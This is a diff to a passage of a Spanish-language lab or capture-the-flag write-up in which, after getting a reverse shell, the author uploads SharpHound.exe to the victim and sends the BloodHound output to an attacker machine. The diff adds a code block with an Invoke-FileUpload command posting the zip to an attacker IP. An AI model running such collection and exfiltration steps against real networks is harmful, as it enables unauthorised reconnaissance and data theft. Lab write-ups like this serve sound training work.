@@ -174,10 +174,14 @@ después de crear el shortcut solo debemos esperar para obtener la reverse shell
 subimos el `SharpHound.exe` a la maquina victima
 ![[Pasted image 20240629124118.png]]
 
-ejecutamos el `./SharpHound.exe` y luego usando el `PSU`
+ejecutamos el `./SharpHound.exe` y luego usando el `PSUpload.ps1` podemos enviarnos el archivo a la maquina atacante
+
+```python
+Invoke-FileUpload -Uri http://10.10.14.47:8000/upload -File "20240629101749_BloodHound.zip"
+```
+
 ![[Pasted image 20240629132729.png]]
 
-Invoke-FileUpload -Uri http://10.10.14.47:8000/upload -File "20240629101749_BloodHound.zip"
 
 
 
